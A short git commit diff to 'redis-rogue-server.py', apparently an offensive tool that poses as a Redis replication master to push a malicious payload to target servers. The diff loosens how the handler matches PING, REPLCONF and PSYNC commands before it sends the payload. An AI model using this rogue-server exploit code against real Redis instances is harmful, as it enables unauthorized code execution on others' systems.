ab68c7c62fcffa060192e1e3def4cf9c87eb6e40
Dliv3 <dddliv3@gmail.com>
2019-07-08 17:57:01 +0800

    有时候协议格式不是Plaintext

--- redis-rogue-server.py
+++ redis-rogue-server.py
@@ -73,14 +73,15 @@ class RogueServer:
     def handle(self, data):
         resp = ""
         phase = 0
-        if data.startswith("PING"):
+        if "PING" in data:
             resp = "+PONG" + CLRF
             phase = 1
-        elif data.startswith("REPLCONF"):
+        elif "REPLCONF" in data:
             resp = "+OK" + CLRF
             phase = 2
-        elif data.startswith("PSYNC") or data.startswith("SYNC"):
+        elif "PSYNC" in data or "SYNC" in data:
             resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
+            # send incorrect length
             resp += "$" + str(len(payload)) + CLRF
             resp = resp.encode()
             resp += payload + CLRF.encode()
